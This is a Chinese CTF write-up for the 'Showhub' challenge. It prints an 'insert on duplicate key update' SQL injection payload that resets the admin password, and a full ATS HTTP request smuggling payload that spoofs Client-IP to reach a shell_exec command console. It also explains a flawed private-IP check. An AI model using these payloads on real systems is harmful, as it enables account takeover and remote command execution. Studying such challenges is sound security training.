# Showhub

## 题目简述

题目给出一个 PHP MVC 框架片段，注册逻辑会调用 `Model::prepareInsert`，该方法用 `sprintf` 拼 SQL，列名和值的格式化方式导致 insert 注入。盲注管理员密码 hash 不实用，关键是用 `insert ... on duplicate key update` 在唯一键冲突时直接改管理员密码。拿到管理员后，后端还要求 `Client-IP` 为内网地址；由于前端反代是 ATS 7.1.2 且会设置 `Client-IP`，需要用 HTTP request smuggling 绕过反代层约束，访问 WebConsole 并执行命令。

题目资料地址：https://github.com/Li4n0/My-CTF-Challenges/tree/master/D%5E3CTF2019_Showhub

题目背景是一个基于自研 PHP 框架的时尚社区，比赛中分值约 `880.7`，仅 `2` 解。题目资料除 `htdocs` 源码外，还提供 `apache2`、`nginx`、`ats-etc`、`docker-compose.yml` 和 `smuggling_payload`，说明题目本身就是“应用层注入 + ATS 反代走私”的组合。`WebConsoleController` 明确要求用户为 `admin` 且 `HTTP_CLIENT_IP` 通过私网判断，`exec()` 直接把 POST 参数 `cmd` 交给 `shell_exec()`，所以拿到管理员后仍必须解决内网 IP 头。

## 解题过程

#### insert on duplicate key update 注入

题目给出了框架部分的源码，只有基本的 MVC 的实现和用户注册登录的逻辑代码。简单审计一下应该就可以发现在 `Model::prepareUpdate` 和 `Model::prepareInsert` 这两个方法中存在 `格式化字符串SQL注入`

```php
static private function prepareInsert($baseSql, $args)
{
    $i = 0;
    if (!empty($args)) {
        foreach ($args as $column => $value) {
            $value = addslashes($value);
            if ($value !== null) {
                if ($i !== count($args) - 1) {
                    $baseSql = sprintf($baseSql, "\`$column\`,%s", "'$value',%s");
                } else {
                    $baseSql = sprintf($baseSql, "\`$column\`", "'$value'");
                }
            }
            $i++;
        }
    }

    return $baseSql;
}

static private function prepareUpdate($baseSql, $args)
{
    $i = 0;
    if (!empty($args)) {
        foreach ($args as $column => $value) {
            $value = addslashes($value);
            if ($value !== null) {
                if ($i !== count($args) - 1) {
                    $baseSql = sprintf($baseSql, "\`$column\`='$value',%s");
                } else {
                    $baseSql = sprintf($baseSql, "\`$column\`='$value'");
                }
            }
            $i++;
        }
    }

    return $baseSql;
}
```

而只有 `prepareInsert` 方法在用户注册时被触发了，那么我们就拥有了一个 `insert` 注入。这时候大多数人第一时间的想法都是通过 `insert` 时间盲注注出管理员密码。然而管理员的密码强度足够，并不能根据其hash值推出明文。

这时候就涉及到了一个比较冷门的 `insert` 注入技巧，就是 `insert on duplicate key update` ，它能够让我们在新插入的一个数据和原有数据发生重复时，修改原有数据。那么我们通过这个技巧修改管理员的密码即可。

payload： `admin%1$',0x60) on duplicate key update password=0x38643936396565663665636164336332396133613632393238306536383663663063336635643561383661666633636131323032306339323361646336633932#`

#### HTTP走私

成为管理员之后，还需要满足 `Client-IP` 为内网 IP。因为这里的 `Client-IP` 头是反代层面设置的（set $Client-IP $remote\_addr）, 所以无法通过前端修改请求头来伪造。

这时可以从服务器返回的 `Server` 头中发现，反代是 `ATS7.1.2` 那么应该很敏感的想到通过 `HTTP走私` 来绕过反代，规避反代设置 `Client-IP` 。这里需要构造两次走私，一次是访问 `/WebConsole` 拿到执行命令的接口，一次是访问接口执行命令，构造走私 `payload` 的过程很有意思，但是嘴上说起来就索然无味了，所以我这里就直接放出我最终的 `payload` ，不再多说这部分都有哪些坑了，真正有兴趣的同学强烈建议自己动手实践一下，有一些有意思的问题等你发现，这个过程也会帮你真正理解 `HTTP走私` 。

payload:

```
GET /WebConsole/ HTTP/1.1
Host: TARGET_HOST
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
DNT: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh,en;q=0.9,zh-CN;q=0.8
Cookie: PHPSESSID=ADMIN_SESSION
Content-Length: 228
Transfer-Encoding: chunked

0

POST /WebConsole/exec HTTP/1.1
Host: TARGET_HOST
Client-IP: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=ADMIN_SESSION
Content-Length: 30

cmd=cat /flag;
```

最后说一下，部分同学可能会发现，走私的请求中，不加 `Client-IP: 127.0.0.1` ，这一行也可以成功执行命令。这其实是因为我在后端判断 IP 是否是内网IP时，使用了网上流传的这样一段代码：

```php
filter_var(
                $_SERVER['HTTP_CLIENT_IP'],
                FILTER_VALIDATE_IP,
                FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
            );//验证ip是否是内网ip，如果是的话返回false，否则返回ip；
```

然而这段代码其实是有问题的，当 `$_SERVER['HTTP_CLIENT_IP']` 不满足 `IPV4` 的格式时，他也会返回 `FALSE` 。

如果把这段代码的问题修复。那么情况又会发生一些变化，一些现在有效的 `payload` 可能会失效。（当然，如果你不自己亲手去试试的话，可能连其他 `payload` 都发现不了）。欢迎并期待各位师傅随时找我探讨。

这个细节说明后端 IP 判断本身也存在边界问题：如果把 `Client-IP` 校验修复为严格 IPv4 私网判断，部分依赖异常返回值的 smuggling payload 会失效。

## 方法总结

- 核心技巧：insert 注入不一定要盲注数据，遇到唯一键和可控插入字段时可考虑 `on duplicate key update` 直接改目标记录。
- 识别信号：管理员密码 hash 强度高、注册点存在 insert 注入、数据库字段包含唯一用户名时，应优先考虑冲突更新而不是继续爆 hash。
- 复用要点：反代层添加的内网头通常不能从客户端直接伪造，但如果反代存在 request smuggling，可让后端收到未被反代规范处理的第二个请求；同时要核对后端 IP 校验代码是否把非法值误判为内网。

